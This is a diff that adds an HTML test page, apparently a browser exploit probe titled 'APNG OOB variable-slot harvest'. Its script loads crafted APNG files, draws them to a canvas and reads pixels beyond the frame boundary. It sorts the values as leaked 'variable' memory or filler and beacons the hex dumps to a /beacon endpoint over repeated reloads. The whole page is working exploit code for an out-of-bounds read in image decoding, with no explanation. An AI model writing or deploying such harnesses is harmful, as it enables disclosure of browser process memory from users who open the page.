@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V948B</title></head>
+<body><pre id="out">V948B — APNG OOB variable-slot harvest (reload-friendly, B)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function rid(){ try{ return (location.search.match(/[?&]cb=([^&]+)/)||[])[1]||('r'+Math.floor(Math.random()*1e6)); }catch(e){return 'r';} }
+var RUN=rid();
+function bk(tag,body){
+  try{new Image().src='/beacon/V948B-'+tag+'?d='+encodeURIComponent(String(body).slice(0,700))+'&t='+Date.now()+'&s=1';}catch(e){}
+}
+function hx(n){ var s=n.toString(16); return s.length<2?'0'+s:s; }
+function p32(d,w,x,y){ var i=(y*w+x)*4; return hx(d[i])+hx(d[i+1])+hx(d[i+2])+hx(d[i+3]); }
+function loadImg(src,n){ return new Promise(function(res,rej){ var im=new Image(); im.onload=function(){res(im)}; im.onerror=function(){rej(new Error('load-fail'))}; im.src=src+'?cb='+RUN+'_'+n+'_'+Math.random(); }); }
+function cls(lo,hi){
+  var q=lo+hi;
+  if(q==='0000000000000000') return 'z';
+  if(lo==='aeaeaeaf'||hi==='aeaeaeaf'||lo==='aeaeaee5'||hi==='aeaeaee5') return 'f';
+  if(lo==='00ff00ff'||lo==='ff0000ff') return 'k';
+  return 'v'; // variable/non-filler (heuristic)
+}
+async function run(name,src,fullW,fullH,frW,iter){
+  bk('T-PRE',RUN+'|'+name+'#'+iter);
+  try{
+    var im=await loadImg(src,iter);
+    var c=document.createElement('canvas'); c.width=fullW; c.height=fullH;
+    var ctx=c.getContext('2d'); ctx.clearRect(0,0,fullW,fullH); ctx.drawImage(im,0,0);
+    var d=ctx.getImageData(0,0,fullW,fullH).data;
+    var rows=[0,1,2];
+    var x0=Math.max(0,frW); var x1=Math.min(fullW-2,frW+8);
+    for(var ri=0;ri<rows.length;ri++){
+      var y=rows[ri], parts=[], vcount=0;
+      for(var x=x0;x<=x1;x+=2){
+        var lo=p32(d,fullW,x,y), hi=p32(d,fullW,x+1,y), c0=cls(lo,hi);
+        if(c0==='v') vcount++;
+        parts.push(x+(c0==='v'?'*':'')+'='+lo+hi);
+      }
+      bk('Q',RUN+'|'+name+'#'+iter+'|y'+y+'|v='+vcount+'|'+parts.join(' '));
+    }
+  }catch(e){ bk('T-ERR',RUN+'|'+name+'#'+iter+'|'+String(e&&e.message||e).slice(0,140)); }
+}
+(async function(){
+  bk('BOOT',RUN+'|x=frW..frW+8 step2, y=0,1,2, iters=4 (*=v heuristic)');
+  for(var it=0;it<4;it++){
+    await run('f128_fr16','v946b_f128_fr16.apng',128,64,16,it);
+    await run('f64_fr16','v946b_f64_fr16.apng',64,64,16,it);
+    await run('f64_fr32','v946b_f64_fr32.apng',64,64,32,it);
+  }
+  bk('DONE',RUN+'|complete|note=compare-across-reloads(cb)');
+  say('\nV948B complete. reload with different ?cb= to compare.');
+})();
+</script>
+</body></html>
